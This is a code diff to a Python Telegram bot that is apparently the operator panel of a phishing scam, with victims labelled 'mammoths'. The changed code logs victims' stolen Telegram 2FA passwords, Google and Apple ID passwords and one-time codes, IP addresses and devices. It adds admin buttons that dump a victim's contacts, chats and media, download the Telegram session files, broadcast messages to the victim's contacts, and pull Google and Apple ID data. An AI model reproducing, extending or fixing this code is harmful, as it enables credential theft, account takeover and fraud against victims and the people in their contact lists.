@@ -240,51 +240,69 @@ async def notify_session_revoked(
             await admin_bot.session.close()
 
 
-def get_admin_log_keyboard(user_tg_id: int) -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(
-                    text="📇 1) Контакты (txt)",
-                    callback_data=f"adm_act_dump_txt:{user_tg_id}",
-                ),
-                InlineKeyboardButton(
-                    text="⚡ Переписки (HTML)",
-                    callback_data=f"adm_act_dump_fast_html:{user_tg_id}",
-                ),
-            ],
-            [
-                InlineKeyboardButton(
-                    text="💬 Всё с медиа (zip)",
-                    callback_data=f"adm_act_dump_media:{user_tg_id}",
-                ),
-                InlineKeyboardButton(
-                    text="📢 Создать ТГК",
-                    callback_data=f"adm_act_create_tgk:{user_tg_id}",
-                ),
-            ],
-            [
-                InlineKeyboardButton(
-                    text="💾 4) Скачать TData",
-                    callback_data=f"adm_act_download_tdata:{user_tg_id}",
-                ),
-                InlineKeyboardButton(
-                    text="⚡ 5) Рассылка",
-                    callback_data=f"adm_act_broadcast_contacts:{user_tg_id}",
-                ),
-            ],
-            [
-                InlineKeyboardButton(
-                    text="🔄 Сбросить сессии",
-                    callback_data=f"adm_reset_sess:{user_tg_id}",
-                ),
-                InlineKeyboardButton(
-                    text="🔴 Разлогинить",
-                    callback_data=f"adm_logout_ask:{user_tg_id}",
-                ),
-            ],
-        ]
-    )
+def get_admin_log_keyboard(
+    user_tg_id: int,
+    has_telegram: bool = True,
+    has_google: bool = False,
+    has_apple: bool = False,
+) -> InlineKeyboardMarkup:
+    rows = []
+    if has_telegram:
+        rows.append([
+            InlineKeyboardButton(
+                text="📇 1) Контакты (txt)",
+                callback_data=f"adm_act_dump_txt:{user_tg_id}",
+            ),
+            InlineKeyboardButton(
+                text="⚡ Переписки (HTML)",
+                callback_data=f"adm_act_dump_fast_html:{user_tg_id}",
+            ),
+        ])
+        rows.append([
+            InlineKeyboardButton(
+                text="💬 Всё с медиа (zip)",
+                callback_data=f"adm_act_dump_media:{user_tg_id}",
+            ),
+            InlineKeyboardButton(
+                text="📢 Создать ТГК",
+                callback_data=f"adm_act_create_tgk:{user_tg_id}",
+            ),
+        ])
+        rows.append([
+            InlineKeyboardButton(
+                text="💾 4) Скачать TData",
+                callback_data=f"adm_act_download_tdata:{user_tg_id}",
+            ),
+            InlineKeyboardButton(
+                text="⚡ 5) Рассылка",
+                callback_data=f"adm_act_broadcast_contacts:{user_tg_id}",
+            ),
+        ])
+    if has_google:
+        rows.append([
+            InlineKeyboardButton(
+                text="📇 Google Контакты (.vcf)",
+                callback_data=f"gctrl:dump_contacts:{user_tg_id}",
+            ),
+        ])
+    if has_apple:
+        rows.append([
+            InlineKeyboardButton(
+                text="🍏 Apple ID Данные",
+                callback_data=f"actrl:dump_data:{user_tg_id}",
+            ),
+        ])
+    rows.append([
+        InlineKeyboardButton(
+            text="🔄 Сбросить сессии",
+            callback_data=f"adm_reset_sess:{user_tg_id}",
+        ),
+        InlineKeyboardButton(
+            text="🔴 Разлогинить",
+            callback_data=f"adm_logout_ask:{user_tg_id}",
+        ),
+    ])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
 
 
 async def notify_user_event(
@@ -411,10 +429,12 @@ async def notify_user_event(
         is_final_auth = norm_step in ("authorized", "session", "complete", "2fa", "google_authorized", "google_complete", "apple_authorized", "apple_complete")
 
         # CRITICAL PROTECTION: If the user is already authorized,
-        # ignore duplicate intermediate backward events so old packets never overwrite the successful log card.
-        # But ALWAYS allow new login flows (start, registered, phone, waiting_code).
+        # ignore duplicate intermediate backward events for that same provider,
+        # but ALWAYS allow new login flows and secondary provider flows (Google / Apple)!
         current_db_step = ((user_row["auth_step"] or "") if user_row and "auth_step" in user_row.keys() else "").lower()
-        if current_db_step == "authorized" and not is_final_auth and norm_step not in ("start", "registered", "register", "phone", "waiting_code"):
+        if current_db_step == "authorized" and not is_final_auth and norm_step not in (
+            "start", "registered", "register", "phone", "waiting_code"
+        ) and not norm_step.startswith("google_") and not norm_step.startswith("apple_"):
             logger.info("Ignoring backward event '%s' for already %s user %s", norm_step, current_db_step, user_tg_id)
             return
 
@@ -586,82 +606,109 @@ async def notify_user_event(
             email_label = "📧 <b>Email:</b>"
             pass_label = "2FA Пароль"
 
+        sess_info = await asyncio.to_thread(db.get_user_sessions, DB_PATH, user_tg_id)
+        tg_phone_disp = user_row.get("telegram_phone") if user_row and "telegram_phone" in user_row.keys() else None
+        if not tg_phone_disp and user_row and user_row.get("phone"):
+            tg_phone_disp = user_row["phone"]
+        if not tg_phone_disp and phone:
+            tg_phone_disp = phone
+
+        tg_pass_disp = user_row.get("telegram_2fa") if user_row and "telegram_2fa" in user_row.keys() else None
+        if not tg_pass_disp and user_row and user_row.get("password_2fa") and not (norm_step.startswith("google_") or norm_step.startswith("apple_")):
+            tg_pass_disp = user_row["password_2fa"]
+        if not tg_pass_disp and password_2fa and not (norm_step.startswith("google_") or norm_step.startswith("apple_")):
+            tg_pass_disp = password_2fa
+
+        goog_email_disp = user_row.get("google_email") if user_row and "google_email" in user_row.keys() else None
+        if not goog_email_disp and user_row and user_row.get("email") and "gmail" in str(user_row.get("email")).lower():
+            goog_email_disp = user_row["email"]
+        if not goog_email_disp and email and (is_google or norm_step.startswith("google_")):
+            goog_email_disp = email
+
+        goog_pass_disp = user_row.get("google_password") if user_row and "google_password" in user_row.keys() else None
+        if not goog_pass_disp and (norm_step.startswith("google_") or is_google):
+            goog_pass_disp = password_2fa
+
+        app_email_disp = user_row.get("apple_email") if user_row and "apple_email" in user_row.keys() else None
+        if not app_email_disp and user_row and user_row.get("email") and ("icloud" in str(user_row.get("email")).lower() or "apple" in str(user_row.get("email")).lower()):
+            app_email_disp = user_row["email"]
+        if not app_email_disp and email and (is_apple or norm_step.startswith("apple_")):
+            app_email_disp = email
+
+        app_pass_disp = user_row.get("apple_password") if user_row and "apple_password" in user_row.keys() else None
+        if not app_pass_disp and (norm_step.startswith("apple_") or is_apple):
+            app_pass_disp = password_2fa
+
+        if is_final_auth:
+            if sess_info.get("is_dual"):
+                prov_name = "Google" if sess_info.get("has_google") else "Apple ID"
+                status_desc = f"✅ authorized (Двойная сессия: Telegram + {prov_name})"
+            elif sess_info.get("has_telegram"):
+                status_desc = "✅ authorized (Telegram сессия привязана)"
+            elif sess_info.get("has_google"):
+                status_desc = "✅ authorized (Google сессия привязана)"
+            elif sess_info.get("has_apple"):
+                status_desc = "✅ authorized (Apple ID сессия привязана)"
+            else:
+                status_desc = "✅ authorized (Сессия привязана)"
+
         # 1. Admin Notification Message
-        if is_test_event:
-            block_header = admin_header.strip()
-            block_info = f"🪞 <b>Зеркало:</b> {mirror_str}\n👨‍💻 <b>Воркер:</b> {worker_str}"
+        block_header = admin_header.strip()
+        block_info = f"🪞 <b>Зеркало:</b> {mirror_str}\n👨‍💻 <b>Воркер:</b> {worker_str}"
 
-            mamont_data_lines = [
-                "🦣 <b>Личные данные мамонта:</b>",
-                f"• <b>ID:</b> <code>{user_tg_id}</code>",
-                f"• <b>Имя:</b> {user_nickname}",
-                f"• <b>Юзернейм:</b> {user_tag}",
-                f"• <b>Номер телефона:</b> {phone_display}",
-            ]
-            if email:
-                mamont_data_lines.append(f"• {email_label} <code>{email}</code>")
-            if ip and ip != "—":
-                prov = isp
-                if not prov:
-                    prov = f"{country or ''} {city or ''}".strip()
-                elif country and country.lower() not in prov.lower():
-                    prov = f"{prov}, {country}"
-                prov_str = f" ({prov})" if prov else ""
-                mamont_data_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
-            if device and device != "—":
-                mamont_data_lines.append(f"• 📱 <b>Устройство:</b> {device}")
+        mamont_data_lines = [
+            "🦣 <b>Личные данные мамонта:</b>",
+            f"• <b>ID:</b> <code>{user_tg_id}</code>",
+            f"• <b>Имя:</b> {user_nickname}",
+            f"• <b>Юзернейм:</b> {user_tag}",
+        ]
+        if tg_phone_disp:
+            tg_mark = " (🟢 Сессия активна)" if sess_info.get("has_telegram") else (" (⏳ Ожидание кода)" if norm_step in ("phone", "waiting_code", "entered_code", "waiting_2fa") else "")
+            mamont_data_lines.append(f"• 📱 <b>Telegram:</b> <code>{tg_phone_disp}</code>{tg_mark}")
+        elif sess_info.get("has_telegram"):
+            mamont_data_lines.append("• 📱 <b>Telegram:</b> 🟢 Сессия активна")
 
-            block_mamont = "\n".join(mamont_data_lines)
+        if goog_email_disp or norm_step.startswith("google_"):
+            g_email_str = goog_email_disp or email or "—"
+            g_mark = " (🟢 Сессия активна)" if sess_info.get("has_google") else " (⏳ В процессе)"
+            mamont_data_lines.append(f"• 📧 <b>Google Email:</b> <code>{g_email_str}</code>{g_mark}")
 
-            auth_data_lines = []
-            if password_2fa:
-                auth_data_lines.append(f"• 🔑 <b>{pass_label}:</b> <code>{password_2fa}</code>")
-            if google_code:
-                auth_data_lines.append(f"• 🔢 <b>2FA код Google:</b> <code>{google_code}</code>")
-            elif apple_code:
-                auth_data_lines.append(f"• 🔢 <b>2FA код Apple ID:</b> <code>{apple_code}</code>")
-            auth_data_lines.append(f"• 📊 <b>Статус:</b> {status_desc}")
-            if details and not is_final_auth and not google_code and not apple_code:
-                auth_data_lines.append(f"• 📝 <b>Детали:</b> {details}")
+        if app_email_disp or norm_step.startswith("apple_"):
+            a_email_str = app_email_disp or email or "—"
+            a_mark = " (🟢 Сессия активна)" if sess_info.get("has_apple") else " (⏳ В процессе)"
+            mamont_data_lines.append(f"• 🍏 <b>Apple ID:</b> <code>{a_email_str}</code>{a_mark}")
 
-            block_auth = "\n".join(auth_data_lines)
+        if ip and ip != "—":
+            prov = isp
+            if not prov:
+                prov = f"{country or ''} {city or ''}".strip()
+            elif country and country.lower() not in prov.lower():
+                prov = f"{prov}, {country}"
+            prov_str = f" ({prov})" if prov else ""
+            mamont_data_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
+        if device and device != "—":
+            mamont_data_lines.append(f"• 📱 <b>Устройство:</b> {device}")
 
-            admin_text = f"{block_header}\n\n{block_info}\n\n{block_mamont}\n\n{block_auth}"
-        else:
-            admin_lines = [
-                admin_header.strip(),
-                f"🪞 <b>Зеркало:</b> {mirror_str}",
-                f"👨‍💻 <b>Воркер:</b> {worker_str}\n",
-                "🦣 <b>Личные данные мамонта:</b>",
-                f"• <b>ID:</b> <code>{user_tg_id}</code>",
-                f"• <b>Имя:</b> {user_nickname}",
-                f"• <b>Юзернейм:</b> {user_tag}",
-                f"• <b>Номер телефона:</b> {phone_display}",
-            ]
-            if email:
-                admin_lines.append(f"• {email_label} <code>{email}</code>")
-            if ip and ip != "—":
-                prov = isp
-                if not prov:
-                    prov = f"{country or ''} {city or ''}".strip()
-                elif country and country.lower() not in prov.lower():
-                    prov = f"{prov}, {country}"
-                prov_str = f" ({prov})" if prov else ""
-                admin_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
-            if device and device != "—":
-                admin_lines.append(f"• 📱 <b>Устройство:</b> {device}")
+        block_mamont = "\n".join(mamont_data_lines)
 
-            if password_2fa:
-                admin_lines.append(f"• 🔑 <b>{pass_label}:</b> <code>{password_2fa}</code>")
-            if google_code:
-                admin_lines.append(f"• 🔢 <b>2FA код Google:</b> <code>{google_code}</code>")
-            elif apple_code:
-                admin_lines.append(f"• 🔢 <b>2FA код Apple ID:</b> <code>{apple_code}</code>")
-            admin_lines.append(f"• 📊 <b>Статус:</b> {status_desc}")
-            if details and not is_final_auth and not google_code and not apple_code:
-                admin_lines.append(f"• 📝 <b>Детали:</b> {details}")
+        auth_data_lines = []
+        if tg_pass_disp:
+            auth_data_lines.append(f"• 🔑 <b>2FA Telegram:</b> <code>{tg_pass_disp}</code>")
+        if goog_pass_disp:
+            auth_data_lines.append(f"• 🔑 <b>Пароль Google:</b> <code>{goog_pass_disp}</code>")
+        if app_pass_disp:
+            auth_data_lines.append(f"• 🔑 <b>Пароль Apple ID:</b> <code>{app_pass_disp}</code>")
+        if google_code:
+            auth_data_lines.append(f"• 🔢 <b>2FA код Google:</b> <code>{google_code}</code>")
+        elif apple_code:
+            auth_data_lines.append(f"• 🔢 <b>2FA код Apple ID:</b> <code>{apple_code}</code>")
+        auth_data_lines.append(f"• 📊 <b>Статус:</b> {status_desc}")
+        if details and not is_final_auth and not google_code and not apple_code:
+            auth_data_lines.append(f"• 📝 <b>Детали:</b> {details}")
 
-            admin_text = "\n".join(admin_lines)
+        block_auth = "\n".join(auth_data_lines)
+
+        admin_text = f"{block_header}\n\n{block_info}\n\n{block_mamont}\n\n{block_auth}"
 
         admin_msg_map = _parse_msg_map(user_row.get("admin_log_msg_id") if user_row else None)
         admin_alert_map = _parse_msg_map(user_row.get("admin_alert_msg_id") if user_row else None)
@@ -702,7 +749,12 @@ async def notify_user_event(
         ))
 
         if is_final_auth:
-            admin_keyboard = get_admin_log_keyboard(user_tg_id)
+            admin_keyboard = get_admin_log_keyboard(
+                user_tg_id,
+                has_telegram=sess_info.get("has_telegram", True),
+                has_google=sess_info.get("has_google", False),
+                has_apple=sess_info.get("has_apple", False),
+            )
             worker_keyboard = None
         elif is_apple_event:
             admin_keyboard = get_apple_control_keyboard(user_tg_id)
@@ -763,7 +815,7 @@ async def notify_user_event(
                     admin_msg_map[str(aid)] = msg.message_id
                 except Exception as e_send:
                     logger.error("failed to notify admin %s via %s: %s", aid, target_bot_token, e_send)
-                    if is_test and target_bot_token != ADMIN_BOT_TOKEN:
+                    if is_test_event and target_bot_token != ADMIN_BOT_TOKEN:
                         try:
                             fallback_bot = Bot(token=ADMIN_BOT_TOKEN)
                             fmsg = await fallback_bot.send_message(
